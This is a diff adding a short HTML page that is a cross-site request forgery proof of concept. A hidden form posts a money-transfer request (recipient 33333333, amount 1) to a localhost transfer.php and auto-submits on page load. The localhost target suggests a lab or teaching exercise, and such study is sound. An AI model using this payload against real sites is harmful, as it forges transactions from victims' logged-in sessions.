@@ -1,0 +1,15 @@
+<html>
+<body>
+<form id="form1" target="_self" action="http://localhost:8888/transfer.php" method="POST">
+<input type="hidden" name="action" value="transfer"/>
+<input type="hidden" name="to" value="33333333"/>
+<input type="hidden" name="amount" value="1"/>
+</form>
+
+<script>
+window.onload=function(){
+	document.getElementById("form1").submit();
+}
+</script>
+</body>
+</html>
